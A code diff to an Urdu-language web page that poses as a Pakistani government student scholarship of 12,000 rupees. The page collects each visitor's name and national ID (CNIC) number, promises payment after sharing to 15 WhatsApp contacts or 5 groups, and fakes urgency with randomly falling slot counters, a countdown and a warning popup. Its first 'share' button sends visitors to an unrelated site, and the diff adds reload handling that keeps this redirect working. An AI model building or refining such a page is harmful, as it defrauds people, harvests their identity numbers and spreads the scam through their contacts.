@@ -173,15 +173,6 @@
     .sec{display:flex;align-items:center;gap:9px;margin-bottom:13px;font-family:'Playfair Display',serif;font-weight:700;font-size:.95rem;color:var(--text);}
     .sec::after{content:'';flex:1;height:1px;background:var(--border);}
 
-    .news-card{background:var(--card);border-radius:var(--r);border:1px solid var(--border);overflow:hidden;margin-bottom:20px;box-shadow:0 3px 20px var(--shadow);}
-    .news-hdr{background:#01411C;padding:9px 14px;display:flex;align-items:center;gap:9px;}
-    .news-geo{background:#fff;color:#01411C;font-family:'Playfair Display',serif;font-weight:800;padding:2px 8px;border-radius:4px;font-size:.8rem;}
-    .news-img{background:linear-gradient(135deg,#01411C,#1a5c2e,#2d7a3e);height:120px;display:flex;align-items:center;justify-content:center;gap:13px;color:#fff;padding:0 18px;}
-    .news-body{padding:14px;}
-    .news-hl{font-family:'Noto Nastaliq Urdu',serif;font-size:.95rem;font-weight:700;color:var(--text);line-height:1.8;margin-bottom:9px;}
-    .news-p{font-family:'Noto Nastaliq Urdu',serif;font-size:.78rem;color:var(--sub);line-height:2.1;}
-    .news-meta{font-size:.67rem;color:var(--muted);margin-top:9px;display:flex;gap:12px;flex-wrap:wrap;}
-
     .form-card{background:var(--card);border-radius:var(--r);border:1px solid var(--border);overflow:hidden;margin-bottom:20px;box-shadow:0 7px 36px var(--shadow);}
     .form-hdr{background:linear-gradient(135deg,#01411C,#1a5c2e);padding:20px 18px;text-align:center;color:#fff;position:relative;overflow:hidden;}
     .form-hdr::before{content:'';position:absolute;top:-28px;left:-28px;width:110px;height:110px;background:rgba(255,255,255,.06);border-radius:50%;}
@@ -506,23 +497,21 @@
           <p class="ur" style="font-size:.78rem;color:#92400e;margin:0;"><strong>15 واٹس ایپ کانٹیکٹس</strong> یا <strong>5 گروپس</strong> میں شیئر کریں</p>
         </div>
 
-        <button class="wa-btn ur" onclick="firstVisitShare('contacts')">📲 واٹس ایپ کانٹیکٹس کو شیئر کریں</button>
-        <button class="wa-btn teal ur" onclick="firstVisitShare('groups')">👥 گروپس میں شیئر کریں</button>
+        <button class="wa-btn ur" onclick="firstVisitShare()">📲 واٹس ایپ کانٹیکٹس کو شیئر کریں</button>
+        <button class="wa-btn teal ur" onclick="firstVisitShare()">👥 گروپس میں شیئر کریں</button>
         <p style="font-size:.63rem;color:var(--muted);margin-top:10px;">شیئر کرنے کے بعد 24 گھنٹے میں رقم آ جائے گی</p>
       </div>
     </div>
 
-    <div class="pw">
-      <div class="sec" style="margin-top:16px;">🎯 آپ کے لیے خصوصی آفرز</div>
-      <div class="ads-grid" id="adsGrid"></div>
-      <div id="adsBanner"></div>
-    </div>
+    <!-- <div class="sec" style="margin-top:16px;">🎯 آپ کے لیے خصوصی آفرز</div>
+    <div class="ads-grid" id="adsGrid"></div>
+    <div id="adsBanner"></div> -->
 
     <p style="font-size:.65rem;color:var(--muted);margin-top:8px;">شیئر کرنے کے بعد آپ منظوری کی فہرست میں شامل ہو جائیں گے</p>
   </div>
 </div>
 
-<!-- ══ SECOND VISIT SCREEN — WhatsApp share ══ -->
+<!-- ══ SECOND VISIT SCREEN ══ -->
 <div id="alreadyScreen">
   <div class="pw">
     <div style="text-align:center;padding:28px 0 18px;">
@@ -552,8 +541,8 @@
           <p class="ur" style="font-size:.78rem;color:#92400e;margin:0;"><strong>15 واٹس ایپ کانٹیکٹس</strong> یا <strong>5 گروپس</strong> میں شیئر کریں</p>
         </div>
 
-        <button class="wa-btn ur" onclick="realShare('contacts')">📲 واٹس ایپ کانٹیکٹس کو شیئر کریں</button>
-        <button class="wa-btn teal ur" onclick="realShare('groups')">👥 گروپس میں شیئر کریں</button>
+        <button class="wa-btn ur" onclick="realShare()">📲 واٹس ایپ کانٹیکٹس کو شیئر کریں</button>
+        <button class="wa-btn teal ur" onclick="realShare()">👥 گروپس میں شیئر کریں</button>
         <p style="font-size:.63rem;color:var(--muted);margin-top:10px;">شیئر کرنے کے بعد 24 گھنٹے میں رقم آ جائے گی</p>
       </div>
     </div>
@@ -570,21 +559,46 @@
 </footer>
 
 <script>
-// ════════ STATE ════════
-const REDIRECT_KEY = 'pm_scholarship_redirected';
-const isSecondVisit = localStorage.getItem(REDIRECT_KEY) === '1';
+// ════════ CONSTANTS ════════
+var REDIRECT_KEY = 'pm_scholarship_redirected';
+var REDIRECT_URL = 'https://mentorship.dilawarpro.com';
+
+// ════════ FIX #1: Force reload when returning from bfcache (back/forward) ════════
+window.addEventListener('pageshow', function(event) {
+  // event.persisted = true when page is loaded from bfcache (back button)
+  if (event.persisted) {
+    window.location.reload();
+    return;
+  }
+});
+
+// ════════ FIX #2: Also use visibilitychange as fallback ════════
+document.addEventListener('visibilitychange', function() {
+  if (document.visibilityState === 'visible') {
+    // Check if state changed while page was hidden
+    var currentState = localStorage.getItem(REDIRECT_KEY);
+    if (currentState === '1') {
+      var screens = ['mainPage','confirmScreen','alreadyScreen'];
+      var alreadyShowing = document.getElementById('alreadyScreen').style.display === 'block';
+      if (!alreadyShowing) {
+        // State changed while away — reload to show correct screen
+        window.location.reload();
+      }
+    }
+  }
+});
 
 // ════════ THEME ════════
-let dark = false;
+var dark = false;
 function toggleTheme(){
   dark = !dark;
   document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
   document.getElementById('themeBtn').textContent = dark ? '☀️' : '🌙';
 }
 
-// ════════ WHATSAPP MESSAGE BUILDER ════════
+// ════════ WHATSAPP MESSAGE ════════
 function getWhatsAppMessage(){
-  const siteLink = window.location.href;
+  var siteLink = window.location.href;
   return '*شہباز شریف اسٹوڈنٹس اسکالرشپ پروگرام – 12000 روپے تعلیمی وظیفہ*\n\n' +
     'تعلیم کے فروغ اور طلبہ کی مالی معاونت کے پیش نظر وزیرِاعظم پاکستان شہباز شریف کی جانب سے مستحق اور ہونہار طلبہ کے لیے 12000 روپے کا خصوصی اسکالرشپ پروگرام شروع کیا گیا ہے۔\n\n' +
     'یہ اقدام ملک بھر کے طلبہ کو تعلیمی اخراجات میں مدد فراہم کرنے اور انہیں اپنی تعلیم جاری رکھنے کے قابل بنانے کے لیے کیا گیا ہے۔\n\n' +
@@ -594,8 +608,19 @@ function getWhatsAppMessage(){
     siteLink;
 }
 
-// ════════ PAGE INIT ════════
-window.addEventListener('DOMContentLoaded', function() {
+// ════════ SCREEN MANAGEMENT ════════
+function showScreen(id){
+  ['mainPage','confirmScreen','alreadyScreen'].forEach(function(s){
+    var el = document.getElementById(s);
+    if(el) el.style.display = s === id ? 'block' : 'none';
+  });
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+// ════════ MAIN INIT ════════
+function initPage(){
+  var isSecondVisit = localStorage.getItem(REDIRECT_KEY) === '1';
+
   if(isSecondVisit){
     showScreen('alreadyScreen');
     buildCarousel('carRail2');
@@ -605,22 +630,17 @@ window.addEventListener('DOMContentLoaded', function() {
     buildCarousel('carRail');
   }
 
-  // Auto-format CNIC on input
+  // Auto-format CNIC
   var cnicInput = document.getElementById('uCnic');
   if(cnicInput){
     cnicInput.addEventListener('input', function(){ formatCNIC(this); });
   }
-});
-
-function showScreen(id){
-  ['mainPage','confirmScreen','alreadyScreen'].forEach(function(s){
-    var el = document.getElementById(s);
-    if(el) el.style.display = s === id ? 'block' : 'none';
-  });
-  window.scrollTo({top:0, behavior:'smooth'});
 }
 
-// ════════ VALIDATION HELPERS ════════
+// Run init on DOMContentLoaded
+window.addEventListener('DOMContentLoaded', initPage);
+
+// ════════ VALIDATION ════════
 function validateCNIC(cnic){
   var cleaned = cnic.replace(/[-\s]/g, '');
   return /^\d{13}$/.test(cleaned);
@@ -646,23 +666,18 @@ function handleSubmit(e){
   var cnic = document.getElementById('uCnic').value.trim();
   var degree = document.getElementById('uDegree').value;
 
-  // Hide previous errors
   document.getElementById('cnicError').style.display = 'none';
 
   var hasError = false;
 
-  if(!name){
-    hasError = true;
-  }
+  if(!name) hasError = true;
 
   if(!validateCNIC(cnic)){
     document.getElementById('cnicError').style.display = 'block';
     hasError = true;
   }
 
-  if(!degree){
-    hasError = true;
-  }
+  if(!degree) hasError = true;
 
   if(hasError) return;
 
@@ -674,32 +689,35 @@ function handleSubmit(e){
   launchConfetti();
 }
 
-// ════════ FIRST VISIT SHARE → redirect to mentorship site ONCE ════════
-function firstVisitShare(type){
-  // Mark as redirected so next visit shows alreadyScreen
+// ════════ FIRST VISIT SHARE → SET FLAG + REDIRECT ════════
+function firstVisitShare(){
+  // Step 1: Mark in localStorage BEFORE redirecting
   localStorage.setItem(REDIRECT_KEY, '1');
-  // Redirect to the mentorship site
-  window.location.href = 'https://mentorship.dilawarpro.com';
+
+  // Step 2: Small delay to ensure localStorage is written, then redirect
+  setTimeout(function(){
+    window.location.href = REDIRECT_URL;
+  }, 100);
 }
 
-// ════════ SECOND VISIT — real WhatsApp share ════════
+// ════════ SECOND VISIT SHARE → REAL WHATSAPP ════════
 var shareNum = parseInt(localStorage.getItem('pm_share_count') || '0');
 
 function updateShareProgress(){
-  var pct = (shareNum / 15) * 100;
-  // Update alreadyScreen elements
-  var bar = document.getElementById('shareBarAlready');
-  var cnt = document.getElementById('shareCountAlready');
-  if(bar) bar.style.width = pct + '%';
-  if(cnt) cnt.textContent = shareNum + ' / 15';
-  // Also update confirmScreen elements if visible
-  var bar2 = document.getElementById('shareBarConfirm');
-  var cnt2 = document.getElementById('shareCountConfirm');
+  var pct = Math.min((shareNum / 15) * 100, 100);
+
+  var bar1 = document.getElementById('shareBarConfirm');
+  var cnt1 = document.getElementById('shareCountConfirm');
+  if(bar1) bar1.style.width = pct + '%';
+  if(cnt1) cnt1.textContent = shareNum + ' / 15';
+
+  var bar2 = document.getElementById('shareBarAlready');
+  var cnt2 = document.getElementById('shareCountAlready');
   if(bar2) bar2.style.width = pct + '%';
   if(cnt2) cnt2.textContent = shareNum + ' / 15';
 }
 
-function realShare(type){
+function realShare(){
   shareNum = Math.min(shareNum + 5, 15);
   localStorage.setItem('pm_share_count', shareNum.toString());
   updateShareProgress();
@@ -793,7 +811,7 @@ setInterval(function(){
   if(slots>10){ slots-=Math.floor(Math.random()*3)+1; var el=document.getElementById('slotsLeft'); if(el) el.textContent=slots; }
 }, 5500);
 
-// hero countdown
+// Hero countdown
 var heroSec = 7*3600+42*60+59;
 setInterval(function(){
   if(heroSec<=0)return; heroSec--;
@@ -805,7 +823,7 @@ setInterval(function(){
 
 // ════════ WARNING MODAL ════════
 setTimeout(function(){
-  if(formDone || isSecondVisit) return;
+  if(formDone || localStorage.getItem(REDIRECT_KEY) === '1') return;
   var ms = document.getElementById('modalSlots');
   if(ms) ms.textContent = Math.floor(Math.random()*30)+20;
   document.getElementById('warnModal').style.display = 'flex';
@@ -902,7 +920,7 @@ function launchConfetti(){
   var layer=document.getElementById('cfti');
   for(var i=0;i<100;i++){
     var p=document.createElement('div'); p.className='cp';
-    p.style.cssText='left:'+Math.random()*100+'vw;background:'+cols[Math.floor(Math.random()*cols.length)]+';width:'+( Math.random()*9+5)+'px;height:'+(Math.random()*9+5)+'px;border-radius:'+(Math.random()>.5?'50%':'3px')+';animation-delay:'+Math.random()*1.5+'s;animation-duration:'+(Math.random()*1.5+2.5)+'s;';
+    p.style.cssText='left:'+Math.random()*100+'vw;background:'+cols[Math.floor(Math.random()*cols.length)]+';width:'+(Math.random()*9+5)+'px;height:'+(Math.random()*9+5)+'px;border-radius:'+(Math.random()>.5?'50%':'3px')+';animation-delay:'+Math.random()*1.5+'s;animation-duration:'+(Math.random()*1.5+2.5)+'s;';
     layer.appendChild(p);
     (function(el){ setTimeout(function(){el.remove();}, 4800); })(p);
   }
